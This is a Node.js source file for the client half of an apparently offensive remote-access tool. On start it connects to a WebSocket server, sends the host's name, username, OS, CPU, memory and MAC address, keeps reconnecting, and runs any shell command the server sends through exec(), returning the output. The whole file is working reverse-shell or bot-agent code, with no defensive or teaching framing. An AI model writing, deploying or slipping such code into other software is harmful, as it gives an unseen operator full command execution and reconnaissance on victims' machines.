import WebSocket from "ws";
import os from "os";
import { networkInterfaces } from "os";
import { exec } from "child_process";

class Client {
  constructor(url = "ws://localhost:3000") {
    this.url = url;
    this.ws = null;
    this.id = `${os.hostname()}-${os.userInfo().username}`;
    this.reconnectInterval = 2000;
    this.connectionAttempts = 0;
    this.reconnectTimer = null;
  }

  getSystemInfo() {
    const nets = networkInterfaces();
    const mac =
      Object.values(nets)
        .flat()
        .find((net) => !net.internal && net.mac !== "00:00:00:00:00:00")?.mac ||
      "Unknown";

    return {
      os: os.type(),
      platform: process.platform,
      arch: os.arch(),
      memory: `${Math.round(os.totalmem() / (1024 * 1024 * 1024))}GB`,
      cpu: os.cpus()[0].model,
      mac,
    };
  }

  connect(id = this.id) {
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      return;
    }

    try {
      this.connectionAttempts++;
      console.log(`[*] Initiating connection attempt ${this.connectionAttempts} to ${this.url}`);
      
      this.ws = new WebSocket(this.url);

      this.ws.on("open", () => {
        console.log(`[+] Secure connection established to ${this.url}`);
        this.connectionAttempts = 0;
        if (this.reconnectTimer) {
          clearTimeout(this.reconnectTimer);
          this.reconnectTimer = null;
        }
        this.identify(id);
      });

      this.ws.on("message", this.onMessage.bind(this));

      this.ws.on("close", () => {
        console.log("[-] Connection terminated");
        this.ws = null;
        this.scheduleReconnect();
      });

      this.ws.on("error", (error) => {
        console.error(`[!] Connection error: ${error.message || "Unknown error"}`);
        if (error.code) {
          console.error(`[!] Error code: ${error.code}`);
        }
      });
    } catch (error) {
      console.error(`[!] Failed to create WebSocket connection: ${error.message}`);
      this.scheduleReconnect();
    }
  }

  onMessage(data) {
    console.log("[<] Raw message received:", data.toString());
    
    try {
      const message = JSON.parse(data.toString());
      console.log("[*] Parsed message type:", message.type);

      if (message.type === "shell") {
        this.handleShellCommand(message.command);
      }
    } catch (error) {
      console.error("[!] Failed to parse message:", error.message);
    }
  }

  handleShellCommand(command) {
    console.log("[*] Executing shell command:", command);
    
    exec(command, (error, stdout, stderr) => {
      console.log("[*] Command execution completed");
      
      const response = {
        type: "shell_response",
        success: !error,
        output: stdout || stderr || "Command executed with no output",
        error: error ? error.message : null
      };

      this.sendResponse(response);
    });
  }

  sendResponse(response) {
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      const responseStr = JSON.stringify(response);
      console.log("[>] Sending response:", responseStr);
      this.ws.send(responseStr);
    } else {
      console.error("[!] Cannot send response - connection lost");
    }
  }

  scheduleReconnect() {
    if (!this.reconnectTimer) {
      console.log(`[*] Scheduling reconnection in ${this.reconnectInterval / 1000} seconds (Attempt ${this.connectionAttempts})...`);
      this.reconnectTimer = setTimeout(() => {
        this.reconnectTimer = null;
        console.log("[*] Attempting to reestablish connection...");
        this.connect();
      }, this.reconnectInterval);
    }
  }

  identify(id) {
    const systemInfo = this.getSystemInfo();
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      this.ws.send(
        JSON.stringify({
          type: "identify",
          id,
          systemInfo,
        })
      );
      console.log("[>] Sent identification payload");
    }
  }

  close() {
    if (this.reconnectTimer) {
      clearTimeout(this.reconnectTimer);
      this.reconnectTimer = null;
    }
    if (this.ws) {
      console.log("[*] Initiating graceful shutdown...");
      this.ws.close();
      this.ws = null;
    }
  }
}

// Create and start the client
const client = new Client();
client.connect();

// Handle graceful shutdown
process.on("SIGINT", () => {
  console.log("\n[*] Received shutdown signal");
  client.close();
  process.exit(0);
});

export default Client;
